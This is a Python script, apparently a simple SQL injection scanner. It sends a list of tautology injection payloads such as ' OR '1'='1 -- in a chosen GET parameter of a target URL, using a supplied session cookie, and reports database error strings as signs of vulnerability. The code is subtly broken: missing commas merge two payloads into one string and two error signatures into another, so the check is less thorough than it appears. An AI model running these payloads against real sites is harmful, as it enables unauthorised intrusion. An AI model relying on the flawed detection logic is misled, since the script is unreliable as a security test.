from RequestPayloader import HTTPRequestHandler
import sys

payloads = [
    "' --"
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR '1'='1'--",
    "' OR 1=1--",
]

error_signatures = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_assoc()",
    "Warning: mysql_num_rows()",
    "Warning: pg_exec()",
    "Warning: sqlite_query()",
    "Warning: sqlsrv_query()",
    "Unclosed quotation mark",
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "You have an error in your SQL syntax"
    "mysql_fetch",
    "syntax error",
]

def is_vulnerable(response):
    for error in error_signatures:
        if response.lower().find(error.lower()) != -1:
            return True
    return False


def main():
    if sys.argv.__len__() < 4:
        print("Error, not all suficient arguments were passed.")
        print(f"usage: python {sys.argv[0]} URL PARAM COOKIE")
        exit(-1)
    url = sys.argv[1]
    param = sys.argv[2]
    session_cookie = sys.argv[3]

    handler = HTTPRequestHandler(url, session_cookie)
    is_it_safe = True
    
    for payload in payloads:
        response = handler.send_request(param=param, new_value=payload, method="GET")
        # response = handler.send_request(param="id", new_value="%27+OR+%271%27%3D%271%27+--", method="POSt")
        # print(response.text)
        # exit()
        if is_vulnerable(response.text):
            print(f"generated error with: {payload} payload")
            is_it_safe = False

    if is_it_safe is False:
        print("web app is vulnerable to sql injection")
    else:
        print("no errors generated with payloads,\
        web app may not be vulnerable to sql injection")




if __name__ == "__main__":
    main()
    exit(0)
